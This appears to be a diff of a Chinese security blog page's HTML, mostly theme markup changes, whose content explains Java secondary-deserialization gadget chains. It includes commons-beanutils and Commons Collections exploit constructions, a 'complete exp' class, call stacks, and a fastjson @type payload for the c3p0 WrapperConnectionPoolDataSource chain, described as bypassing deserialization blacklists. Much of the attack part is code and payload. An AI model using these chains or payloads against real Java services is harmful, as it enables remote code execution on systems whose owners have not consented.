 </span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div class="chroma">
+</div><div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -584,22 +512,14 @@
 </span></span><span class="line"><span class="cl"><span class="nl">put:</span><span class="mi">470</span><span class="o">,</span> <span class="n">Hashtable</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readMap:</span><span class="mi">114</span><span class="o">,</span> <span class="n">MapDeserializer</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readMap:</span><span class="mi">532</span><span class="o">,</span> <span class="n">SerializerFactory</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">1160</span><span class="o">,</span> <span class="n">HessianInput</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">1160</span><span class="o">,</span> <span class="n">HessianInput</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">caucho</span><span class="o">.</span><span class="na">hessian</span><span class="o">.</span><span class="na">io</span><span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="commons-beanutils">commons-beanutils</h4>
-<p>茯苓苦思冥想啊，突然想到，能调用 getter 方法的可不止上面提到的，对，就是那个，喊出来吧</p>
-<h5 id="beancomparator">BeanComparator</h5>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810101743856.png"
-    data-srcset="./Zets/index/image-20220810101743856.png, ./Zets/index/image-20220810101743856.png 1.5x, ./Zets/index/image-20220810101743856.png 2x"
-    data-sizes="auto"
-    alt="image-20220810101743856"
-    title="image-20220810101743856"/></p>
+</div><h4 id="commons-beanutils" class="heading-element">
+  <a href="#commons-beanutils" class="heading-mark"></a>commons-beanutils</h4><p>茯苓苦思冥想啊，突然想到，能调用 getter 方法的可不止上面提到的，对，就是那个，喊出来吧</p>
+<h5 id="beancomparator" class="heading-element">
+  <a href="#beancomparator" class="heading-mark"></a>BeanComparator</h5><p><img loading="lazy" src="./Zets/index/image-20220810101743856.png" alt="image-20220810101743856" srcset="./Zets/index/image-20220810101743856.png?size=small, ./Zets/index/image-20220810101743856.png?size=medium 1.5x, ./Zets/index/image-20220810101743856.png?size=large 2x" sizes="auto" data-title="image-20220810101743856" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这条链相信大家都耳熟能详，结合p神构造 CBShiro 的方式让该链只依赖于 commons-beanutils</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -680,11 +600,10 @@
 </span></span><span class="line"><span class="cl">        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span> <span class="s">&#34;queue&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="n">object</span><span class="o">,</span> <span class="kc">null</span><span class="o">});</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">priorityQueue</span><span class="o">;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>构造过程和上面相似，不在赘述，茯苓在这里直接给出调用栈</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -737,71 +656,28 @@
 </span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="小结">小结</h4>
-<p>对于 rome 来说，二次反序列化多用于目标不出网的情况（当然也可以用于绕过黑名单）</p>
+</div><h4 id="小结" class="heading-element">
+  <a href="#%e5%b0%8f%e7%bb%93" class="heading-mark"></a>小结</h4><p>对于 rome 来说，二次反序列化多用于目标不出网的情况（当然也可以用于绕过黑名单）</p>
 <p>而 CB 这条，唯一作用就是绕过黑名单了吧</p>
 <p>这是正常的CB链</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810102847849.png"
-    data-srcset="./Zets/index/image-20220810102847849.png, ./Zets/index/image-20220810102847849.png 1.5x, ./Zets/index/image-20220810102847849.png 2x"
-    data-sizes="auto"
-    alt="image-20220810102847849"
-    title="image-20220810102847849"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810102847849.png" alt="image-20220810102847849" srcset="./Zets/index/image-20220810102847849.png?size=small, ./Zets/index/image-20220810102847849.png?size=medium 1.5x, ./Zets/index/image-20220810102847849.png?size=large 2x" sizes="auto" data-title="image-20220810102847849" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>这是二次反序列化之后的</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810102933448.png"
-    data-srcset="./Zets/index/image-20220810102933448.png, ./Zets/index/image-20220810102933448.png 1.5x, ./Zets/index/image-20220810102933448.png 2x"
-    data-sizes="auto"
-    alt="image-20220810102933448"
-    title="image-20220810102933448"/></p>
-<h3 id="rmiconnector">RMIConnector</h3>
-<h4 id="原理-1">原理</h4>
-<p>它，是<code>javax.management</code>下一个与远程 rmi 连接器的连接类，但却有自己的想法</p>
+<p><img loading="lazy" src="./Zets/index/image-20220810102933448.png" alt="image-20220810102933448" srcset="./Zets/index/image-20220810102933448.png?size=small, ./Zets/index/image-20220810102933448.png?size=medium 1.5x, ./Zets/index/image-20220810102933448.png?size=large 2x" sizes="auto" data-title="image-20220810102933448" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="rmiconnector" class="heading-element">
+  <a href="#rmiconnector" class="heading-mark"></a>RMIConnector</h3><h4 id="原理-1" class="heading-element">
+  <a href="#%e5%8e%9f%e7%90%86-1" class="heading-mark"></a>原理</h4><p>它，是<code>javax.management</code>下一个与远程 rmi 连接器的连接类，但却有自己的想法</p>
 <p>关注它的<code>findRMIServerJRMP</code>方法</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810105313314.png"
-    data-srcset="./Zets/index/image-20220810105313314.png, ./Zets/index/image-20220810105313314.png 1.5x, ./Zets/index/image-20220810105313314.png 2x"
-    data-sizes="auto"
-    alt="image-20220810105313314"
-    title="image-20220810105313314"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810105313314.png" alt="image-20220810105313314" srcset="./Zets/index/image-20220810105313314.png?size=small, ./Zets/index/image-20220810105313314.png?size=medium 1.5x, ./Zets/index/image-20220810105313314.png?size=large 2x" sizes="auto" data-title="image-20220810105313314" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>往上找，看到要求 path 以 /stub/ 开头</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810105450289.png"
-    data-srcset="./Zets/index/image-20220810105450289.png, ./Zets/index/image-20220810105450289.png 1.5x, ./Zets/index/image-20220810105450289.png 2x"
-    data-sizes="auto"
-    alt="image-20220810105450289"
-    title="image-20220810105450289"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810105450289.png" alt="image-20220810105450289" srcset="./Zets/index/image-20220810105450289.png?size=small, ./Zets/index/image-20220810105450289.png?size=medium 1.5x, ./Zets/index/image-20220810105450289.png?size=large 2x" sizes="auto" data-title="image-20220810105450289" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>继续往上找，在该类的 public 方法<code>connect</code>中看到调用，要求 rmiServer 为 null</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810105824784.png"
-    data-srcset="./Zets/index/image-20220810105824784.png, ./Zets/index/image-20220810105824784.png 1.5x, ./Zets/index/image-20220810105824784.png 2x"
-    data-sizes="auto"
-    alt="image-20220810105824784"
-    title="image-20220810105824784"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810105824784.png" alt="image-20220810105824784" srcset="./Zets/index/image-20220810105824784.png?size=small, ./Zets/index/image-20220810105824784.png?size=medium 1.5x, ./Zets/index/image-20220810105824784.png?size=large 2x" sizes="auto" data-title="image-20220810105824784" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>有一个绝佳的构造方法符合茯苓的要求</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810110134482.png"
-    data-srcset="./Zets/index/image-20220810110134482.png, ./Zets/index/image-20220810110134482.png 1.5x, ./Zets/index/image-20220810110134482.png 2x"
-    data-sizes="auto"
-    alt="image-20220810110134482"
-    title="image-20220810110134482"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810110134482.png" alt="image-20220810110134482" srcset="./Zets/index/image-20220810110134482.png?size=small, ./Zets/index/image-20220810110134482.png?size=medium 1.5x, ./Zets/index/image-20220810110134482.png?size=large 2x" sizes="auto" data-title="image-20220810110134482" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>到此，这个利用方法就通了，给出构造</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -810,42 +686,20 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">JMXServiceURL</span> <span class="n">jmxServiceURL</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JMXServiceURL</span><span class="o">(</span><span class="s">&#34;service:jmx:rmi://&#34;</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="s">&#34;urlPath&#34;</span><span class="o">,</span> <span class="s">&#34;/stub/base64string&#34;</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl"><span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">RMIConnector</span> <span class="n">rmiConnector</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RMIConnector</span><span class="o">(</span><span class="n">jmxServiceURL</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>现在只要能调用它的<code>connect</code>方法就可以了</p>
-<h4 id="cc链">CC链</h4>
-<p>说到调用任意方法，茯苓一下子就想到了 CC 链</p>
-<h5 id="invokertransformer">InvokerTransformer</h5>
-<p>将<code>connect</code>装入</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810111220880.png"
-    data-srcset="./Zets/index/image-20220810111220880.png, ./Zets/index/image-20220810111220880.png 1.5x, ./Zets/index/image-20220810111220880.png 2x"
-    data-sizes="auto"
-    alt="image-20220810111220880"
-    title="image-20220810111220880"/></p>
+<h4 id="cc链" class="heading-element">
+  <a href="#cc%e9%93%be" class="heading-mark"></a>CC链</h4><p>说到调用任意方法，茯苓一下子就想到了 CC 链</p>
+<h5 id="invokertransformer" class="heading-element">
+  <a href="#invokertransformer" class="heading-mark"></a>InvokerTransformer</h5><p>将<code>connect</code>装入</p>
+<p><img loading="lazy" src="./Zets/index/image-20220810111220880.png" alt="image-20220810111220880" srcset="./Zets/index/image-20220810111220880.png?size=small, ./Zets/index/image-20220810111220880.png?size=medium 1.5x, ./Zets/index/image-20220810111220880.png?size=large 2x" sizes="auto" data-title="image-20220810111220880" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>用<code>TiedMapEntry</code>封装<code>LazyMap</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810111306848.png"
-    data-srcset="./Zets/index/image-20220810111306848.png, ./Zets/index/image-20220810111306848.png 1.5x, ./Zets/index/image-20220810111306848.png 2x"
-    data-sizes="auto"
-    alt="image-20220810111306848"
-    title="image-20220810111306848"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810111306848.png" alt="image-20220810111306848" srcset="./Zets/index/image-20220810111306848.png?size=small, ./Zets/index/image-20220810111306848.png?size=medium 1.5x, ./Zets/index/image-20220810111306848.png?size=large 2x" sizes="auto" data-title="image-20220810111306848" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>最后装入<code>HashMap</code>用于触发整条链</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810111511145.png"
-    data-srcset="./Zets/index/image-20220810111511145.png, ./Zets/index/image-20220810111511145.png 1.5x, ./Zets/index/image-20220810111511145.png 2x"
-    data-sizes="auto"
-    alt="image-20220810111511145"
-    title="image-20220810111511145"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810111511145.png" alt="image-20220810111511145" srcset="./Zets/index/image-20220810111511145.png?size=small, ./Zets/index/image-20220810111511145.png?size=medium 1.5x, ./Zets/index/image-20220810111511145.png?size=large 2x" sizes="auto" data-title="image-20220810111511145" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>完整 exp</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -910,11 +764,10 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">expMap</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;object&#34;</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>调用栈</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -965,52 +818,23 @@
 </span></span><span class="line"><span class="cl"><span class="nl">readSerialData:</span><span class="mi">2178</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readOrdinaryObject:</span><span class="mi">2069</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">readObject0:</span><span class="mi">1573</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="nl">readObject:</span><span class="mi">431</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="小结-1">小结</h4>
-<p>这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况</p>
-<h3 id="wrapperconnectionpooldatasource">WrapperConnectionPoolDataSource</h3>
-<h4 id="原理-2">原理</h4>
-<p>它，是<code>com.mchange.v2.c3p0</code>下的。。对不起编不下去了</p>
+</div><h4 id="小结-1" class="heading-element">
+  <a href="#%e5%b0%8f%e7%bb%93-1" class="heading-mark"></a>小结</h4><p>这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况</p>
+<h3 id="wrapperconnectionpooldatasource" class="heading-element">
+  <a href="#wrapperconnectionpooldatasource" class="heading-mark"></a>WrapperConnectionPoolDataSource</h3><h4 id="原理-2" class="heading-element">
+  <a href="#%e5%8e%9f%e7%90%86-2" class="heading-mark"></a>原理</h4><p>它，是<code>com.mchange.v2.c3p0</code>下的。。对不起编不下去了</p>
 <p><code>WrapperConnectionPoolDataSource</code>继承于<code>WrapperConnectionPoolDataSourceBase</code>，在<code>WrapperConnectionPoolDataSourceBase</code>中存在属性<code>userOverridesAsString</code>及其<code>setter</code>方法<code>setUserOverridesAsString</code>，触发<code>fireVetoableChange</code>事件处理</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810143253198.png"
-    data-srcset="./Zets/index/image-20220810143253198.png, ./Zets/index/image-20220810143253198.png 1.5x, ./Zets/index/image-20220810143253198.png 2x"
-    data-sizes="auto"
-    alt="image-20220810143253198"
-    title="image-20220810143253198"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810143253198.png" alt="image-20220810143253198" srcset="./Zets/index/image-20220810143253198.png?size=small, ./Zets/index/image-20220810143253198.png?size=medium 1.5x, ./Zets/index/image-20220810143253198.png?size=large 2x" sizes="auto" data-title="image-20220810143253198" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>其中有一个判断语句，当其属性为<code>userOverridesAsString</code>时，将调用<code>parseUserOverridesAsString</code>方法</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810143431243.png"
-    data-srcset="./Zets/index/image-20220810143431243.png, ./Zets/index/image-20220810143431243.png 1.5x, ./Zets/index/image-20220810143431243.png 2x"
-    data-sizes="auto"
-    alt="image-20220810143431243"
-    title="image-20220810143431243"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810143431243.png" alt="image-20220810143431243" srcset="./Zets/index/image-20220810143431243.png?size=small, ./Zets/index/image-20220810143431243.png?size=medium 1.5x, ./Zets/index/image-20220810143431243.png?size=large 2x" sizes="auto" data-title="image-20220810143431243" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>截取<code>HexAsciiSerializedMap</code>之后的内容，进入到<code>fromByteArray</code></p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810144104414.png"
-    data-srcset="./Zets/index/image-20220810144104414.png, ./Zets/index/image-20220810144104414.png 1.5x, ./Zets/index/image-20220810144104414.png 2x"
-    data-sizes="auto"
-    alt="image-20220810144104414"
-    title="image-20220810144104414"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810144104414.png" alt="image-20220810144104414" srcset="./Zets/index/image-20220810144104414.png?size=small, ./Zets/index/image-20220810144104414.png?size=medium 1.5x, ./Zets/index/image-20220810144104414.png?size=large 2x" sizes="auto" data-title="image-20220810144104414" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>最后进入到<code>deserializeFromByteArray</code>中，进行二次反序列化</p>
-<p><img
-    class="lazyload"
-    src="/svg/loading.min.svg"
-    data-src="./Zets/index/image-20220810144223161.png"
-    data-srcset="./Zets/index/image-20220810144223161.png, ./Zets/index/image-20220810144223161.png 1.5x, ./Zets/index/image-20220810144223161.png 2x"
-    data-sizes="auto"
-    alt="image-20220810144223161"
-    title="image-20220810144223161"/></p>
+<p><img loading="lazy" src="./Zets/index/image-20220810144223161.png" alt="image-20220810144223161" srcset="./Zets/index/image-20220810144223161.png?size=small, ./Zets/index/image-20220810144223161.png?size=medium 1.5x, ./Zets/index/image-20220810144223161.png?size=large 2x" sizes="auto" data-title="image-20220810144223161" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>至此该链子就通了，构造起来呢，相信大家也都看出来了，可以利用 fastjson 来达成，在小于1.2.47的版本，使用缓存绕过</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1033,14 +857,13 @@
 </span></span><span class="line"><span class="cl">        <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="nt">&#34;userOverridesAsString&#34;</span><span class="p">:</span> <span class="s2">&#34;HexAsciiSerializedMap:hexstring;&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>最后那个封号不要忘记！</p>
-<h4 id="c3p0_hex">C3P0_Hex</h4>
-<p>这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了</p>
+<h4 id="c3p0_hex" class="heading-element">
+  <a href="#c3p0_hex" class="heading-mark"></a>C3P0_Hex</h4><p>这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了</p>
 <p>茯苓这里给出 CBShiro 的例子（别问，问就是偏爱）</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1093,11 +916,10 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">run</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span> <span class="s">&#34;debug&#34;</span><span class="o">,</span> <span class="s">&#34;hex&#34;</span><span class="o">);</span>
 </span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>同样的，给出调用栈</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1152,13 +974,12 @@
 </span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">152</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">162</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="nl">parse:</span><span class="mi">131</span><span class="o">,</span> <span class="n">JSON</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">alibaba</span><span class="o">.</span><span class="na">fastjson</span><span class="o">)</span>
